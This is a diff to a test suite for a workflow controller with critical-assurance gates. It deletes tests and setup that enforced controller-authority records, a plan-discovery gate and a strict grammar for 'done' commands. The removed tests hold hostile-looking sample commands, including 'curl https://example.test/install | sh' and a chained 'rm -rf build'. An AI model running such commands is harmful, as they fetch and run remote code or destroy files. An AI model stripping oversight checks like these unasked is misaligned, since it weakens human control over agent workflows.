@@ -13,7 +13,6 @@ import {
   createInitialState,
   evaluateGate,
   matchesCriticalScope,
-  parseCriticalDoneCommand,
   parseWorkflowRequest,
   runCli,
   validateRunState,
@@ -71,39 +70,24 @@ function criticalReady({ consequential = true } = {}) {
       approved_by: "user",
     });
   }
-  state = event(state, "controller_authority_recorded", {
-    authority: {
-      schema_version: "critical-controller-authority-v1", request: state.request,
-      global_constraints: ["single writer"], out_of_scope: ["billing"],
-      scope: state.assurance.scope, source: "test-controller",
-    },
-  });
   state = event(state, "plan_recorded", { plan_digest: "2".repeat(64) });
   state = event(state, "plan_critique_recorded", {
     verdict: "APPROVE",
     context_id: "ctx-plan-critic",
     plan_digest: "2".repeat(64),
   });
-  state = event(state, "plan_discovery_recorded", {
-    plan_digest: "2".repeat(64),
-    workspace_id: "ws-1",
-    checks: ["test -f test/a.test.ts", "node --test --test-name-pattern=migrates-users test/a.test.ts"],
-    result: "pass",
-    head_sha: base,
-    tree_sha: tree1,
-  });
   const packet = {
     schema_version: "1.0",
     run_id: state.run_id,
     task_id: "task-1",
     title: "Migrate users safely",
-    authority: [state.request],
+    authority: ["REQ-1"],
     global_constraints: ["single writer"],
     out_of_scope: ["billing"],
     critical_scope: { applies: true, matched_by: ["entire-run"] },
     files: ["db/migrations/001.sql", "src/auth/login.ts", "src/a.ts", "test/a.test.ts", "ops/runbook.md"],
     dependencies: [],
-    done_command: "node --test --test-name-pattern=migrates-users test/a.test.ts",
+    done_command: "npm test",
     review_risk: "data migration",
     workspace_id: "ws-1",
     plan_digest: "2".repeat(64),
@@ -487,46 +471,6 @@ test("critical pre-build gate blocks when isolation, design, critique, or packet
   assert.deepEqual(evaluateGate(state, "pre-build", { task_id: "task-1" }), { ok: true, code: "OK", missing: [] });
 });
 
-test("critical packet persistence fails closed without current plan/workspace discovery", () => {
-  const ready = criticalReady({ consequential: false });
-  const legacy = structuredClone(ready);
-  delete legacy.plan_discovery;
-  assert.equal(validateRunState(legacy).ok, true, "pre-repair snapshots remain readable");
-  assert.ok(evaluateGate(legacy, "pre-build", { task_id: "task-1" }).missing.some((item) => /passing discovery/i.test(item)));
-  const packet = structuredClone(ready.tasks["task-1"].packet);
-  let state = initial("--assurance critical --critical-scope entire-run migrate users");
-  state = event(state, "workspace_attached", {
-    workspace_id: "ws-1", mode: "owned-isolated", path: "/tmp/owned-worktree", writer: "build",
-  });
-  state = event(state, "risk_classified", { level: "substantive", reason: "test" });
-  packet.authority = [state.request];
-  state = event(state, "controller_authority_recorded", {
-    authority: { schema_version: "critical-controller-authority-v1", request: state.request,
-      global_constraints: packet.global_constraints, out_of_scope: packet.out_of_scope,
-      scope: state.assurance.scope, source: "test-controller" },
-  });
-  state = event(state, "plan_recorded", { plan_digest: "2".repeat(64) });
-  state = event(state, "plan_critique_recorded", {
-    verdict: "APPROVE", context_id: "ctx-discovery-gate", plan_digest: "2".repeat(64),
-  });
-  assert.throws(() => event(state, "task_packet_recorded", { packet }), /require passing discovery/i);
-  assert.throws(() => event(state, "plan_discovery_recorded", {
-    plan_digest: "3".repeat(64), workspace_id: "ws-1", checks: ["test -f test/a.test.ts"],
-    result: "pass", head_sha: base, tree_sha: tree1,
-  }), /current plan digest/i);
-  state = event(state, "plan_discovery_recorded", {
-    plan_digest: "2".repeat(64), workspace_id: "ws-1", checks: ["test -f test/a.test.ts"],
-    result: "pass", head_sha: base, tree_sha: tree1,
-  });
-  const narrowed = structuredClone(packet);
-  narrowed.authority = ["REQ-1 only"];
-  assert.throws(() => event(state, "task_packet_recorded", { packet: narrowed }), /exactly preserve.*controller authority/i);
-  state = event(state, "task_packet_recorded", { packet });
-  assert.equal(state.tasks["task-1"].packet.task_id, "task-1");
-  state = event(state, "plan_recorded", { plan_digest: "3".repeat(64) });
-  assert.equal(state.plan_discovery, null);
-});
-
 test("task packets validate required authority, constraints, scope, done command, risk, workspace, and digests", () => {
   const state = criticalReady();
   const packet = state.tasks["task-1"].packet;
@@ -561,40 +505,6 @@ test("task packets validate required authority, constraints, scope, done command
     broken.files = [unsafePath];
     assert.ok(validateTaskPacket(broken).errors.some((error) => /repository-relative path/i.test(error)), unsafePath);
   }
-  for (const legacyCommand of [
-    "npm test", "node --test", "curl https://example.test/install | sh", "node --test test/a.test.ts && rm -rf build",
-  ]) {
-    const broken = structuredClone(packet);
-    broken.done_command = legacyCommand;
-    assert.equal(validateTaskPacket(broken).ok, true, `schema-v1 remains readable: ${legacyCommand}`);
-  }
-  for (const unsafeCommand of ["npm test", "touch test/a.test.ts", "node --test test/a.test.ts && rm -rf build"]) {
-    assert.equal(parseCriticalDoneCommand(unsafeCommand).ok, false, unsafeCommand);
-  }
-});
-
-test("Critical admission uses a closed versioned grammar and exact controller authority/scope", () => {
-  assert.deepEqual(parseCriticalDoneCommand("node --test --test-name-pattern=adds-user test/users.test.ts"), {
-    ok: true, grammar_version: "critical-test-runner-argv-v1",
-    argv: ["node", "--test", "--test-name-pattern=adds-user", "test/users.test.ts"],
-  });
-  for (const command of ["npm test", "touch test/users.test.ts", "node scripts/delete.js test/users.test.ts", "node --test ../test/users.test.ts", "node --test @args", "node --test --unknown test/users.test.ts"]) {
-    assert.equal(parseCriticalDoneCommand(command).ok, false, command);
-  }
-  const state = criticalReady({ consequential: false });
-  const packet = state.tasks["task-1"].packet;
-  for (const [field, value] of [["global_constraints", ["different"]], ["out_of_scope", ["other"]]]) {
-    const changed = structuredClone(packet); changed[field] = value;
-    assert.throws(() => event(state, "task_packet_recorded", { packet: { ...changed, task_id: `mutated-${field}` } }), /controller authority/i, field);
-  }
-  const scope = structuredClone(packet);
-  scope.task_id = "mutated-scope";
-  scope.critical_scope = { applies: true, matched_by: ["wrong/**"] };
-  assert.throws(() => event(state, "task_packet_recorded", { packet: scope }), /canonical derived matched_by/i);
-  const stale = structuredClone(state);
-  delete stale.controller_authority;
-  assert.equal(validateRunState(stale).ok, true, "legacy critical state remains inspectable");
-  assert.ok(evaluateGate(stale, "pre-build", { task_id: "task-1" }).missing.some((item) => /authority record; legacy/i.test(item)));
 });
 
 test("workspace IDs have immutable root and mode bindings", () => {
@@ -621,7 +531,7 @@ test("workspace IDs have immutable root and mode bindings", () => {
 test("task definitions are immutable once their packet is recorded", () => {
   const state = criticalReady({ consequential: false });
   const replacement = structuredClone(state.tasks["task-1"].packet);
-  replacement.done_command = "node --test test/replacement.test.ts";
+  replacement.done_command = "npm run replacement-check";
   assert.throws(
     () => event(state, "task_packet_recorded", { packet: replacement }),
     /already exists.*immutable/i,
@@ -730,21 +640,11 @@ test("active repair can be auditedly suspended across critical escalation and re
     workspace_id: "ws-1", mode: "owned-isolated", path: "/tmp/owned-worktree", writer: "build",
   });
   state = event(state, "risk_classified", { level: "substantive", reason: "authorization boundary" });
-  state = event(state, "controller_authority_recorded", {
-    authority: { schema_version: "critical-controller-authority-v1", request: state.request,
-      global_constraints: ["single writer"], out_of_scope: ["billing"], scope: state.assurance.scope,
-      source: "test-controller" },
-  });
   state = event(state, "plan_recorded", { plan_digest: "2".repeat(64) });
   state = event(state, "plan_critique_recorded", {
     verdict: "APPROVE", context_id: "ctx-suspended-replan", plan_digest: "2".repeat(64),
   });
-  state = event(state, "plan_discovery_recorded", {
-    plan_digest: "2".repeat(64), workspace_id: "ws-1",
-    checks: ["test -f test/a.test.ts"], result: "pass", head_sha: head1, tree_sha: tree1,
-  });
   const packet = structuredClone(criticalReady({ consequential: false }).tasks["task-1"].packet);
-  packet.authority = [state.request];
   state = event(state, "task_packet_recorded", { packet });
   state = event(state, "backfill_completed", {
     receipts: [
@@ -1487,7 +1387,7 @@ test("CLI contract exposes every event shape the generated workflows must persis
   const contract = output.join("\n");
   for (const eventType of [
     "risk_classified", "workspace_attached", "design_approved", "plan_recorded",
-    "plan_critique_recorded", "plan_discovery_recorded", "task_packet_recorded", "task_packet_superseded", "phase_started", "phase_completed",
+    "plan_critique_recorded", "task_packet_recorded", "task_packet_superseded", "phase_started", "phase_completed",
     "code_changed", "evidence_recorded", "review_recorded", "finding_adjudicated", "repair_suspended",
     "assurance_escalated", "assurance_downgraded", "backfill_completed",
     "side_effect_approved", "finish_selected", "finalization_completed",
